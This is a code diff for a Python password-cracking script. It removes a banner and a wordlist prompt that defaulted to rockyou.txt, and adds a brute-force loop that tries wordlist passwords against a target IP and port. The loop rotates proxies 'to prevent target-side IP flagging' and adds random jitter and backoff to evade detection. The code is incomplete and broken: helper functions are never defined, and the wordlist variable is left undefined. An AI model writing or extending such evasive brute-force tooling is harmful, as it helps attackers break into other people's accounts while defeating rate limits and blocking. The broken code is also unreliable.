@@ -1,39 +1,33 @@
 import os
 import time
+import random
 from colorama import init, Fore
 
-# Initialize colorama
 init(autoreset=True)
 
-def show_banner():
-    banner = r"""
-     ____                                        ___ 
-    / __ )____ _____  ____ _____  ____ _   _   _|__ \
-   / __  / __ `/ __ \/ __ `/ __ \/ __ `/  | | / /_/ /
-  / /_/ / /_/ / / / / /_/ / / / / /_/ /   | |/ / __/ 
- /_____/\__,_/_/ /_/\__,_/_/ /_/\__,_/    |___/____/
-    """
-    print(Fore.YELLOW + banner)
-
-def get_wordlist():
-    choice = input("Use default 'rockyou.txt'? (y/n): ").lower()
-    
-    if choice == 'y':
-        path = "rockyou.txt"
-    else:
-        path = input("Enter the path to your wordlist: ")
-    
-    if not os.path.exists(path):
-        print("File not found.")
-        return None
-    return path
-
 def run_cracker():
-    show_banner()
+    # ... (Setup and inputs) ...
     
-    wordlist = get_wordlist()
-    if not wordlist:
-        return
+    # 6. Protection: Proxy Rotation
+    # Rotate proxies to prevent target-side IP flagging
+    current_proxy = get_random_proxy()
+    
+    with open(wordlist, 'r', encoding='latin-1') as f:
+        for password in f:
+            password = password.strip()
+            time.sleep(random.uniform(1.5, 4.0)) # Jitter
+            
+            attempt = 0
+            while attempt < 3:
+                try:
+                    # Logic using proxy and timeout
+                    attempt_connection(target_ip, port, password, current_proxy)
+                    break 
+                except Exception:
+                    attempt += 1
+                    # 7. Protection: Rotate proxy after a failure
+                    current_proxy = get_random_proxy() 
+                    time.sleep(2**attempt) # Exponential Backoff
 
     print(f"Using wordlist: {wordlist}")
     
